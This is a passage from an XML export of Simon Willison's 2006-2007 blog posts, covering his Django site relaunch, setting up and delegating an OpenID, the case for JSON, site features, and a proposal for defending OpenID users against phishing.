		<field name="body">&lt;p&gt;It's been way too long, but I've finally replaced the ball of PHP duct tape that has run this site for the past four years with a shiny new blog engine powered by &lt;a href=&quot;http://www.djangoproject.com/&quot;&gt;Django&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I've moved to my own domain (simonwillison.net) on a virtual server hosted by &lt;a href=&quot;http://www.bytemark.co.uk/&quot;&gt;Bytemark&lt;/a&gt;. I'd like to extend a big thanks to &lt;a href=&quot;http://www.incutio.com/&quot;&gt;Incutio&lt;/a&gt; for hosting me for the past four years. Moving a site that's been around for this long is going to be pretty painful; if you've linked to me in the past I'd appreciate it if you could update the link. I'll be adding redirects from the old site once I've seen how well the new system copes with proper traffic.&lt;/p&gt;

&lt;p&gt;I've also redesigned (feed readers, &lt;a href=&quot;http://simonwillison.net/&quot;&gt;click here now!&lt;/a&gt;). One of the biggest problems with my old design was that it emphasized my entries which were posted only a few times a month at the expense of links, updated several times a day. The new front page emphasizes both, with a much clearer indication of when new content has been added.&lt;/p&gt;

&lt;p&gt;Unfortunately this means my feeds are moving. I'm serving the new ones through FeedBurner, but I've shelled out for a vanity subdomain so at least they stay within my domain space. You can subscribe to &lt;a href=&quot;http://feeds.simonwillison.net/swn-everything&quot;&gt;everything&lt;/a&gt; (links and entries), &lt;a href=&quot;http://feeds.simonwillison.net/swn-entries&quot;&gt;just the entries&lt;/a&gt; or &lt;a href=&quot;http://feeds.simonwillison.net/swn-links&quot;&gt;just the links&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I've opened comments on links and expanded the format to directly display my commentary rather than hiding it in a tooltip. I've always liked the way &lt;a href=&quot;http://photomatt.net/&quot;&gt;Matt Mullenweg&lt;/a&gt; and &lt;a href=&quot;http://daringfireball.net/linked/&quot;&gt;John Gruber&lt;/a&gt; write short-form entries around their links and hope to start doing something similar here.&lt;/p&gt;

&lt;p&gt;Finally, I've imported my photos and sets from Flickr. I haven't posted anything there in a little while, but you can see an example of the integration on the archive page for &lt;a href=&quot;http://simonwillison.net/2005/Jan/6/&quot;&gt;6th January 2005&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I'm still taking the bubble wrap off things, so please tell me if you spot any bugs.&lt;/p&gt;</field>
		<field name="created">2006-12-15 14:11:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1544</field>
		<field name="title">How to turn your blog in to an OpenID</field>
		<field name="slug">openid</field>
		<field name="body">&lt;p&gt;Wouldn't it be great if you could use the same account to log in to multiple sites and applications, without having to trust them all with your password? Wouldn't it be even better if you could do this without having to hand ownership of your online identity over to some monolithic third party? (I'm looking at you, &lt;del&gt;.NET Passport&lt;/del&gt; &lt;del&gt;Microsoft Passport&lt;/del&gt; &lt;a href=&quot;http://en.wikipedia.org/wiki/Windows_Live_ID&quot;&gt;Windows Live ID&lt;/a&gt;.)&lt;/p&gt;

&lt;p&gt;The good news is, you can! &lt;a href=&quot;http://openid.net/&quot;&gt;OpenID&lt;/a&gt; is a decentralised authentication system invented by LiveJournal but now being developed as an open standard under the &lt;a href=&quot;http://incubator.apache.org/projects/heraldry.html&quot; title=&quot;The Heraldry Project&quot;&gt;careful mentorship&lt;/a&gt; of the Apache Software Foundation. Anyone can create an OpenID, and the number of sites which let you log in with one is growing by the day.&lt;/p&gt;

&lt;p&gt;An OpenID is simply a URL. My OpenID is &lt;a href=&quot;http://simonwillison.net/&quot;&gt;simonwillison.net&lt;/a&gt;, the address of my weblog. I can use it to sign in to any site that supports OpenID, and because I'm the only person with control over my weblog's homepage I'm the only person who can use that identity.&lt;/p&gt;

&lt;p&gt;If you want your own OpenID (and you should), here's how to get one.&lt;/p&gt;

&lt;h4&gt;1. Sign up with an OpenID provider&lt;/h4&gt;

&lt;p&gt;OpenID is decentralised, which means that anyone can set themselves up as an OpenID provider. You can run your own server if you want to (&lt;a href=&quot;http://siege.org/projects/phpMyID/&quot;&gt;phpMyID&lt;/a&gt; is one way of doing that) but there are a number of free services that will host an ID for you. Those include:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.livejournal.com/&quot;&gt;LiveJournal&lt;/a&gt;. They invented it, and if you have a LiveJournal account you already have an OpenID - it's the URL of your journal. I'm &lt;samp&gt;swillison.livejournal.com&lt;/samp&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.vox.com/&quot;&gt;Vox&lt;/a&gt; - Six Apart's sexy new social network thang. I'm &lt;samp&gt;simon.vox.com&lt;/samp&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://pip.verisignlabs.com/&quot;&gt;VeriSign Labs&lt;/a&gt;, who have done some excellent work around OpenID and run a provider as part of their Personal Identity Provider service. I'm &lt;samp&gt;swillison.pip.verisignlabs.com&lt;/samp&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://www.myopenid.com/&quot;&gt;MyOpenID&lt;/a&gt;, run by JanRain, authors of the most widely used OpenID libraries. I'm &lt;samp&gt;swillison.myopenid.com&lt;/samp&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;If you already have an account with Vox or LiveJournal you can skip straight to step 2. If not, pick the provider that you trust the most and create an account there. This isn't a permanent decision: you can move provider at any time without losing your account, provided you follow step 2.&lt;/p&gt;

&lt;h4&gt;2. Point your own site at your new OpenID&lt;/h4&gt;

&lt;p&gt;Here comes the magic. Having picked your provider and created an OpenID there, edit the HTML of your weblog's homepage (or indeed whichever URL you want to use as your personal OpenID) and add the following to the document &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&amp;lt;link rel=&quot;openid.server&quot;
  href=&quot;http://www.livejournal.com/openid/server.bml&quot;&amp;gt;
&amp;lt;link rel=&quot;openid.delegate&quot;
  href=&quot;http://swillison.livejournal.com/&quot;&amp;gt;
&lt;/pre&gt;

&lt;p&gt;Replace the openid.delegate href with the OpenID at your provider, and the openid.server href with that provider's OpenID server. You can find the server by viewing source on your OpenID page there, or by using this table:&lt;/p&gt;

&lt;table&gt;
 &lt;tr&gt;
  &lt;th&gt;OpenID Provider&lt;/th&gt;&lt;th&gt;Server URL&lt;/th&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
  &lt;td&gt;LiveJournal&lt;/td&gt;
  &lt;td&gt;http://www.livejournal.com/openid/server.bml&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
  &lt;td&gt;Vox&lt;/td&gt;
  &lt;td&gt;http://www.vox.com/services/openid/server&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
  &lt;td&gt;VeriSign&lt;/td&gt;
  &lt;td&gt;https://pip.verisignlabs.com/server&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
  &lt;td&gt;MyOpenID&lt;/td&gt;
  &lt;td&gt;http://www.myopenid.com/server&lt;/td&gt;
 &lt;/tr&gt;
&lt;/table&gt;

&lt;p&gt;This delegation mechanism is key to OpenID's status as a truly decentralised authentication system. If you decide you no longer trust your identity provider you can switch to another one by just editing a couple of lines of HTML - your OpenID will stay the same.&lt;/p&gt;

&lt;h4&gt;3. Log in to something!&lt;/h4&gt;

&lt;p&gt;Now that you have an OpenID, you can use it to log in to all sorts of sites. Find their OpenID login form and enter your new OpenID - that's the URL of your weblog. You will be redirected to a page on your identity provider which will either ask you to log in or ask you to authorize the site to use your identity. Click &quot;Yes&quot; and you'll be sent back to the original site and magically logged in - no password required.&lt;/p&gt;

&lt;p&gt;I've been collecting a list of sites that allow you to log in using OpenID under the &lt;a href=&quot;http://del.icio.us/tag/openidconsumer&quot;&gt;openidconsumer tag&lt;/a&gt;; sites you may have heard of include &lt;a href=&quot;http://ma.gnolia.com/signin&quot;&gt;Ma.gnolia&lt;/a&gt;, &lt;a href=&quot;http://beta.zooomr.com/login&quot;&gt;Zooomr&lt;/a&gt; and &lt;a href=&quot;http://wikitravel.org/en/Special:OpenIDLogin&quot;&gt;Wikitravel&lt;/a&gt;.&lt;/p&gt;

&lt;h4&gt;OpenID on simonwillison.net&lt;/h4&gt;

&lt;p&gt;This whole entry is a round-about way of announcing the addition of OpenID support to my weblog engine. You can sign in &lt;a href=&quot;http://simonwillison.net/openid/&quot;&gt;here&lt;/a&gt;; once signed in you'll be able to leave comments with a pretty OpenID logo (proving that they came from you) and track recent comments that you've posted on the &lt;a href=&quot;http://simonwillison.net/comments/yours/&quot;&gt;Your Comments&lt;/a&gt; page. I'm working on adding other functionality for logged-in users such as the ability to edit your own comments or for trusted users to flag comment spam.&lt;/p&gt;

&lt;p&gt;This kind of light-weight account mechanism is one of the things that makes OpenID so interesting. I doubt I could convince anyone to create a new account just to access a few features on my weblog, but if they already have an OpenID the overhead of logging in is small enough that I'm hopeful at least a few people will give it a go.&lt;/p&gt;

&lt;p&gt;As always, report any bugs in the comments.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; I've created a screencast showing &lt;a href=&quot;http://simonwillison.net/2006/openid-screencast/&quot;&gt;how to use OpenID&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2006-12-19 11:37:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1545</field>
		<field name="title">Why JSON isn't just for JavaScript</field>
		<field name="slug">json</field>
		<field name="body">&lt;p&gt;Dave Winer's &lt;a href=&quot;http://www.scripting.com/2006/12/20.html#godBlessTheReinventers&quot; title=&quot;God bless the re-inventers&quot;&gt;discovery of JSON&lt;/a&gt; (and shock that &quot;it's not even XML&quot;) has triggered an interesting discussion thread, &lt;a href=&quot;http://scripting.wordpress.com/2006/12/20/scripting-news-for-12202006/&quot;&gt;on his blog&lt;/a&gt; and &lt;a href=&quot;http://technorati.com/search/www.scripting.com%2F2006%2F12%2F20.html%23godBlessTheReinventers&quot; title=&quot;Technorati links to that URL&quot;&gt;elsewhere&lt;/a&gt;. Plenty of people have re-assured him (and themselves) that it's only used for JavaScript - it's convenient in the browser but irrelevant elsewhere.&lt;/p&gt;

&lt;p&gt;That simply isn't true. Let's look at the problem &lt;a href=&quot;http://www.json.org/&quot;&gt;JSON&lt;/a&gt; solves:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;I have a data structure on server / platform / programming environment A. I want to use it on server / platform / programming environment B.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Surely that problem has been solved a hundred times before? That's what XML's for, right?&lt;/p&gt;

&lt;p&gt;Here's an example data structure, of the kind you might want to transmit from one place to another (represented as a Python dictionary; mentally replace with the syntax from your programming language of choice).&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;javascript&quot;&gt;person = {
  &quot;name&quot;: &quot;Simon Willison&quot;,
  &quot;age&quot;: 25,
  &quot;height&quot;: 1.68,
  &quot;urls&quot;: [
    &quot;http://simonwillison.net/&quot;,
    &quot;http://www.flickr.com/photos/simon/&quot;,
    &quot;http://simon.incutio.com/&quot;
  ]
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It's a simple example, but it demonstrates the core data structures that any modern dynamic language is likely to support: strings, integers, floating points, hashes (or dictionaries or associative arrays depending on terminology) and lists (or sequences or arrays).&lt;/p&gt;

&lt;p&gt;So how do I represent this in a language-neutral format? Obviously I can use XML. I could invent my own custom representation:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;xml&quot;&gt;&amp;lt;person&amp;gt;
  &amp;lt;name&amp;gt;Simon Willison&amp;lt;/name&amp;gt;
  &amp;lt;age&amp;gt;25&amp;lt;/age&amp;gt;
  &amp;lt;height&amp;gt;1.68&amp;lt;/height&amp;gt;
  &amp;lt;urls&amp;gt;
    &amp;lt;url&amp;gt;http://simonwillison.net/&amp;lt;/url&amp;gt;
    ...
  &amp;lt;/urls&amp;gt;
&amp;lt;/person&amp;gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;But this means writing a bunch of boilerplate code. I need code to build the XML format, and code to parse it (using SAX or DOM or whatever) at the other end. I need to write this code in every language/platform that I want to communicate with. That's a lot of extra effort!&lt;/p&gt;

&lt;p&gt;So let's be smarter about this and reuse an existing format. If there's an XML-based standard for the exact data I'm representing I could use that; if there are good libraries supporting it for the languages that I'm using I don't have to write any extra parsing code.&lt;/p&gt;

&lt;p&gt;If that isn't the case, I need to look at XML standards that can represent our standard data types. As Dave points out, our principle options here are SOAP and XML-RPC.&lt;/p&gt;

&lt;p&gt;By most accounts SOAP is a total pain to get anything done with, so let's look at XML-RPC. XML-RPC encodes the exact data types we want, but wraps them up in a RPC mechanism. I have no need for any of the &amp;lt;methodCall&amp;gt; / &amp;lt;methodResponse&amp;gt; boiler plate; I just want to represent the data, not specify a remote method to call.&lt;/p&gt;

&lt;p&gt;So I could use a subset of XML-RPC that's just the data representation - in fact, that's really not a bad idea. But then I'd have to figure out how to get the various XML-RPC libraries to parse just the data structures without barfing at the lack of an envelope.&lt;/p&gt;

&lt;p&gt;I also face the problem that XML-RPC isn't particularly human-readable. In fact, XML itself tends not to be brilliantly readable: the data gets lost among the angle brackets.&lt;/p&gt;

&lt;p&gt;Enter JSON. The smartest thing about JSON is that it addresses the need for a light-weight standard for representing those core data types and, rather than inventing a new one, uses a subset of an existing one: ECMAScript, more commonly known as JavaScript.&lt;/p&gt;

&lt;p&gt;JavaScript has excellent syntax for both object and array literals (something Java could certainly learn from); remember, in JavaScript an object is basically an associative array. JSON takes that syntax and makes it generally applicable. Because JavaScript is a programming language, JSON syntax is naturally readable and writable by human beings.&lt;/p&gt;

&lt;p&gt;If you take away the assignment statement the Python example I gave earlier is also valid JSON. JSON is also a subset of YAML, an earlier attempt at a human readable/writable serialization format. More importantly, JSON libraries almost certainly exist for your language of choice (there are 24 languages represented in the list on &lt;a href=&quot;http://www.json.org/&quot;&gt;JSON.org&lt;/a&gt;). Most of them provide two functions - &lt;samp&gt;json_encode($data)&lt;/samp&gt; and &lt;samp&gt;json_decode($json)&lt;/samp&gt;  - and that's all you need.&lt;/p&gt;

&lt;p&gt;The sweet spot for JSON is serializing simple data structures for transfer between programming languages. If you need more complex data structures (maybe with some kind of schema for validation), use XML. If you want to do full blown RPC use SOAP or XML-RPC. If you just want a light-weight format for moving data around, JSON fits the bill admirably.&lt;/p&gt;

&lt;p&gt;What do we lose from not using XML? The ability to use XML tools. If you're someone who breathes XSLT that might be a problem; if like me your approach when faced with XML is to parse it in to a more agreeable data structure as soon as possible you'll find JSON far more productive.&lt;/p&gt;</field>
		<field name="created">2006-12-20 23:49:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1546</field>
		<field name="title">OpenID screencast</field>
		<field name="slug">screencast</field>
		<field name="body">&lt;p&gt;OpenID's biggest problem is its learning curve. Using it as actually really simple, but if you're not technical the amount of stuff you have to know before you can understand it is enormous. If you &lt;em&gt;are&lt;/em&gt; technical, it just doesn't seem like it should work - there are a bunch of questions that come up every time OpenID is discussed anywhere (&quot;but surely there's nothing to stop someone else from spoofing your ID&quot;) which OpenID has answers for, but which are easily misunderstood.&lt;/p&gt;

&lt;p&gt;The magical moment with OpenID comes the first time you log in to a site by typing your OpenID and clicking a button. In my experience, that's the point where people convert from OpenID skeptics in to OpenID believers.&lt;/p&gt;

&lt;p&gt;To that end, I've put together a screencast:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;http://simonwillison.net/2006/openid-screencast/&quot;&gt;How to use OpenID&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;It's 5 minutes 46 seconds long and demonstrates creating an OpenID (using &lt;a href=&quot;http://www.myopenid.com&quot;&gt;MyOpenID&lt;/a&gt;) and logging in to a number of websites with it, then explains how other providers can be used to avoid having a single point of failure. It also touches on delegation; I decided not to cover that in detail for fear of giving people too much information up-front.&lt;/p&gt;

&lt;p&gt;It's the first screencast I've done, and I can confirm what everyone else has said: those things take ages! It took around seven hours to edit together less than six minutes of footage. If anyone's interested I can write up some of the things I learnt in the process. Mark Pilgrim's &lt;a href=&quot;http://howto.diveintomark.org/about/&quot; title=&quot;howto.diveintomark.org: About&quot;&gt;notes&lt;/a&gt; proved invaluable.&lt;/p&gt;

&lt;p&gt;I'm hoping to get the screencast in front of as many people as possible, so please link to it if you find it useful. Link directly to &lt;a href=&quot;http://simonwillison.net/2006/openid-screencast/&quot;&gt;the screencast page&lt;/a&gt; and not to this entry; the screencast page is being served statically by &lt;a href=&quot;http://nginx.net/&quot;&gt;nginx&lt;/a&gt; which should hopefully help avoid a repeat of the meltdown I had &lt;a href=&quot;http://simonwillison.net/2006/Dec/19/&quot;&gt;on Tuesday&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2006-12-22 21:29:42</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1547</field>
		<field name="title">More home improvements</field>
		<field name="slug">improvements</field>
		<field name="body">&lt;p&gt;I've had an offline Christmas, not entirely through choice (broadband at my Dad's new place in rural France isn't working yet) but welcome. I did have my laptop with me, and I'm using &lt;a href=&quot;http://bazaar-vcs.org/&quot;&gt;Bazaar&lt;/a&gt; for version control so being offline isn't a barrier to checking in code. I've just rolled out a bunch of new features that I put together over the past few days.&lt;/p&gt;

&lt;h4&gt;Comments watchlist&lt;/h4&gt;

&lt;p&gt;A long-running problem with weblogs is that if you post a comment somewhere it's easy to lose track of that thread and miss any replies that other people might post. If you log in to this site with an OpenID you now have access to &lt;a href=&quot;http://simonwillison.net/comments/watchlist/&quot;&gt;a watchlist&lt;/a&gt;. You can add any post on the site to your watchlist and follow new comments on one page. More importantly, you can subscribe to an atom feed of comments posted to items on your watchlist.&lt;/p&gt;

&lt;p&gt;When you post a comment, the item you are commenting on is automatically added to your watchlist. This means you can subscribe to your watchlist feed and automatically follow threads that you have contributed to.&lt;/p&gt;

&lt;p&gt;The downside is that you still have to subscribe to a feed just to follow comments on this site. If more sites adopted a similar feature it's possible that something a bit less time consuming could emerge - after all, your OpenID is the same on every site you comment on so given the right standard it could be possible to automatically create a &quot;global&quot; watchlist for any site you have commented on.&lt;/p&gt;

&lt;h4&gt;New talks section&lt;/h4&gt;

&lt;p&gt;I've done quite a lot of public speaking over the past 18 months, and I've put together &lt;a href=&quot;http://simonwillison.net/talks/&quot;&gt;a new section&lt;/a&gt; with details of talks I've given and links to supporting material. The material is a bit thin at the moment but I hope to add more over the next few weeks.&lt;/p&gt;

&lt;h4&gt;Style changes&lt;/h4&gt;

&lt;p&gt;Comments now have pretty pseudo-bubbles around them (thanks for the help, &lt;a href=&quot;http://natbat.net/&quot;&gt;Nat&lt;/a&gt;) with different coloured borders for comments posted by OpenID users (orange) or myself (purple). I've made some tweaks to the design elsewhere as well, the most obvious of which is the purple divider line between the two columns used on pages other than the homepage.&lt;/p&gt;

&lt;h4&gt;Colophon enhancements&lt;/h4&gt;

&lt;p&gt;I always enjoy reading the colophon in O'Reilly books, which is hidden away at the back and describes the typefaces and processes used to publish the book (and the characteristics of the animal on the front). I added a colophon to &lt;a href=&quot;http://simonwillison.net/about/&quot;&gt;my about page&lt;/a&gt; a few weeks ago; I've updated it and added a feed of the last few changelog messages checked in to Bazaar.&lt;/p&gt;

&lt;p&gt;Bazaar is written in Python, so I can pull data from it using the bzrlib module directly in my Django view:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;
# This import prevents later ImportErrors
from bzrlib.branch import BzrBranch
from bzrlib.bzrdir import BzrDir

repo = BzrDir.open(BZRDIR).open_repository()
revisions = repo.get_revisions(
  repo.all_revision_ids()[-8:]
)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I'm using similar code to append a revision number to my CSS and JavaScript links, busting the cache in stubborn browsers such as IE and Safari.&lt;/p&gt;</field>
		<field name="created">2007-01-07 21:21:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1548</field>
		<field name="title">An OpenID is not an account!</field>
		<field name="slug">account</field>
		<field name="body">&lt;p&gt;I'm excited to see that OpenID has finally started to gain serious traction outside of the Identity community. Understandably, misconceptions about OpenID continue to crop-up. The one I want to address in this entry is the idea that an OpenID can be used as a replacement for a regular user account.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;&lt;strong&gt;Update at 23:55pm:&lt;/strong&gt; I originally tried to illustrate this misconception with a quote &lt;a href=&quot;http://www.docuverse.com/blog/donpark/2007/01/09/openid-blues&quot;&gt;from Don Park&lt;/a&gt;; unfortunately I misunderstood the quote and consequently misrepresented his position, for which I apologise unreservedly.&lt;/em&gt;&lt;/p&gt;
 
&lt;p&gt;The &lt;a href=&quot;http://web.archive.org/web/20050521002209/www.danga.com/openid/&quot;&gt;old OpenID homepage&lt;/a&gt; (which I miss; the &lt;a href=&quot;http://openid.net/&quot;&gt;new one&lt;/a&gt; uses jargon-heavy terms like &quot;a free framework for user-centric digital identity&quot;) included this in nice big letters:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;What about trust?&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This is not a trust system. Trust requires identity first.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;OpenID solves the identity problem, not the trust problem. When a user authenticates with OpenID, what they are doing is stating &lt;strong&gt;&quot;I have the ability to prove my ownership of this URL&quot;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;I used the phrase &quot;have the ability&quot; deliberately. Just because the OpenID authentication was successful doesn't mean that the user is the only person who can authenticate against that OpenID. It would be trivial to create the OpenID equivalent of &lt;a href=&quot;http://www.mailinator.com/&quot;&gt;Mailinator&lt;/a&gt;: an identity provider that says &quot;Yes, that's them!&quot; to any identity request. I'm tempted to build it just to emphasize this point! &lt;strong&gt;Update:&lt;/strong&gt; Jayant Gandhi &lt;a href=&quot;http://www.jkg.in/openid/&quot;&gt;has built one&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The key thing here is that you should never trust an OpenID on its own. It could be a real person, or it could be a spammer, psycopath or general undesirable.&lt;/p&gt;

&lt;p&gt;Does this mean OpenID is completely useless? Absolutely not! You just have to think of it in the same way that you think of username and password combinations: as the &quot;key&quot; to an account.&lt;/p&gt;

&lt;p&gt;Most web application signup processes work something like this:&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;Bob selects a username&lt;/li&gt;
 &lt;li&gt;Bob enters a password, twice&lt;/li&gt;
 &lt;li&gt;Bob enters his e-mail address&lt;/li&gt;
 &lt;li&gt;Bob clicks a validation link in an e-mail sent to that address&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Some sites throw a CAPTCHA in there for good measure.&lt;/p&gt;

&lt;p&gt;OpenID replaces at most the first two steps of that registration process. Instead of having a user set up a new password you get them to authenticate with their OpenID &lt;em&gt;at the start of the process&lt;/em&gt;. After that you might still want them to pick a username (especially if you are integrating OpenID in to an existing account system) and you'll almost certainly want them to jump through the e-mail and/or CAPTCHA steps.&lt;/p&gt;

&lt;p&gt;In the future, they can sign in to your site using their OpenID rather than having to dig around for whichever username and password they used.&lt;/p&gt;

&lt;p&gt;A nice thing about the above flow is that it demonstrates how easy it should be to add OpenID support to an existing Web application. If you've already got a user account system that's fine - just give your users a mechanism to associate an OpenID with their existing account so they can log in without using their password. You could even require new users to set up a full account (complete with password that they never intend to use) and then associate it with their OpenID, although doing so eliminates the lower barrier to entry advantage for OpenID users.&lt;/p&gt;

&lt;p&gt;The trust issue is now null and void. An OpenID is just as trustworthy as a regular username and password (which could have been posted to &lt;a href=&quot;http://www.bugmenot.com/&quot;&gt;bugmenot&lt;/a&gt; and shared with thousands of people).&lt;/p&gt;

&lt;p&gt;One last time: an OpenID is not an account. Just treat it as an alternative to a traditional username and password and you can't go wrong.&lt;/p&gt;</field>
		<field name="created">2007-01-10 10:53:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1549</field>
		<field name="title">Leaving Yahoo!, going freelance</field>
		<field name="slug">leaving</field>
		<field name="body">&lt;p&gt;Last Friday was my last day at Yahoo!. I've had a fantastic time there, and will really miss working with &lt;a href=&quot;http://www.plasticbag.org/&quot; title=&quot;Tom Coates&quot;&gt;Tom&lt;/a&gt;, &lt;a href=&quot;http://www.paulhammond.org/&quot; title=&quot;Paul Hammond&quot;&gt;Paul&lt;/a&gt; and the many other superb Yahoos I've had the privilege to meet.&lt;/p&gt;

&lt;p&gt;I'm leaving for entirely personal reasons. The plan had always been to move out to the US for the job, but it became clear that &lt;a href=&quot;http://notes.natbat.net/&quot; title=&quot;Natalie Downe&quot;&gt;my girlfriend&lt;/a&gt; would not have been able to move with me. When it came down to it I decided my relationship with her came first. We moved in together several months ago and our quality of life has been enormously improved as a result. Even the lure of San Francisco (and &lt;a href=&quot;http://www.flickr.com/photos/simon/27061001/&quot;&gt;the best burgers in the world&lt;/a&gt;) can't compete with that.&lt;/p&gt;

&lt;p&gt;As of today, I'm going freelance. I'll be working for three days a week for &lt;a href=&quot;http://www.torchbox.com/&quot;&gt;Torchbox&lt;/a&gt;, an excellent web development company based near Oxford that specialises in sites for charities and the public sector. The other two days are available for freelance projects; please drop me a line (simon @ this domain) if there's something I can help you with.&lt;/p&gt;

&lt;p&gt;I'm also looking forward to investing time in projects of my own. 2007 will be an exciting year.&lt;/p&gt;</field>
		<field name="created">2007-01-15 01:16:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1550</field>
		<field name="title">Solving the OpenID phishing problem</field>
		<field name="slug">phishing</field>
		<field name="body">&lt;p&gt;Most of the arguments I hear against OpenID are based on mis-understandings of the specification, but there is one that can't be ignored: OpenID is extremely vulnerable to phishing.&lt;/p&gt;

&lt;p&gt;Phishing attacks work by tricking a user in to visiting a replica of the login page for a service, usually through a spam e-mail. OpenID compounds the problem by training users to use login forms that they have been redirected to by untrusted sites. A malicious site could easily redirect to a proxy that copies the login form from the user's identity provider, and the vast majority of users would be none the wiser - a classic man-in-the-middle attack. Ben Laurie's &lt;a href=&quot;http://www.links.org/?p=187&quot;&gt;OpenID: Phishing Heaven&lt;/a&gt; describes this problem in more detail.&lt;/p&gt;

&lt;p&gt;I have a proposal for identity providers which I think could dramatically reduce the risk of phishing, without mandating a client-side plugin.&lt;/p&gt;

&lt;p&gt;When an OpenID consumer application redirects a user to their identity provider there are three possible outcomes:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;The user is already logged in to their identity provider but has not previously used the application in question. Show them a &quot;Do you want to share your identity with X?&quot; confirmation prompt.&lt;/li&gt;
&lt;li&gt;The user is already logged in to their identity provider and has previously stated that they always trust this application. Redirect them straight back  without any further steps.&lt;/li&gt;
&lt;li&gt;The user is NOT already logged in to their application provider. Show them the provider's login form.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Phishing attempts target the third one, and that's where identity providers can fight back. Instead of displaying the login form directly, providers should show a page that looks something like this:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;
To log in, please navigate to &lt;strong&gt;login.example.com&lt;/strong&gt;. The page your are currently viewing should contain no links; if there are any links or this text is changed in any way you may become a victim of &lt;strong&gt;online identity theft&lt;/strong&gt;.
&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;Identity providers should &lt;em&gt;never&lt;/em&gt; display their authentication interface directly on the page shown to a user after an OpenID redirect, or even provide a link to it. They should instead use that page to inform their users about the dangers of online identity theft. Educating users is a demonstrably flawed strategy in computer security, but forcing them to learn how to browse to the login page themselves should be far more effective than just displaying a warning notice.&lt;/p&gt;

&lt;p&gt;It's important that the login page URL be short, distinctive and memorable. This is a good rule of thumb for all applications, not just OpenID providers.&lt;/p&gt;

&lt;p&gt;This proposal certainly isn't 100% fool-proof, but I doubt that any solution to phishing ever could be (someone can always invent a better fool). The effectiveness of the approach could be dramatically increased by disciplined usability testing of the instruction page itself.&lt;/p&gt;

&lt;p&gt;I don't know of any identity providers that currently do this, but &lt;a href=&quot;http://simonwillison.net/2006/Dec/19/openid/&quot; title=&quot;How to turn your blog in to an OpenID&quot;&gt;delegation&lt;/a&gt; makes switching providers trivial and security is likely to emerge as a key way for them to compete. There's plenty of scope for innovation here.&lt;/p&gt;

&lt;p&gt;If there are any holes in my thinking I'd love to hear about them in the comments. &lt;strong&gt;Update:&lt;/strong&gt; Tons of &lt;a href=&quot;http://simonwillison.net/2007/Jan/19/phishing/#comments&quot;&gt;smart comments&lt;/a&gt; on this one.&lt;/p&gt;</field>
		<field name="created">2007-01-19 14:39:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1551</field>
		<field name="title">Social whitelisting with OpenID</field>
		<field name="slug">whitelisting</field>
		<field name="body">&lt;p id=&quot;p-0&quot;&gt;A key feature of OpenID is that it provides a globally unique identifier for every user, no matter what site or service they are using on the Web.&lt;/p&gt;

&lt;p id=&quot;p-1&quot;&gt;This gives us a powerful tool to fight comment spam. If someone has logged in with an OpenID &lt;em&gt;and&lt;/em&gt; we are confident that they are not a spammer (remember, spammers can create OpenIDs too) we can add them to a whitelist, allowing their comments to skip any moderation step or spam guard that we might have in place.&lt;/p&gt;

&lt;p id=&quot;p-2&quot;&gt;This weblog has a comment spam detection system  based on simple heuristics. Comments are assigned a score; if the score exceeds a certain level the comment is placed in a queue for moderation. As of today, one of the heuristics is &quot;does the comment author have an OpenID that is on the whitelist&quot;. I've populated my whitelist with the OpenIDs of people who have posted two or more useful comments  and do not appear to be using an &lt;a href=&quot;http://www.jkg.in/openid/&quot;&gt;anonymous provider&lt;/a&gt;. I'll be adding to it regularly in the future.&lt;/p&gt;

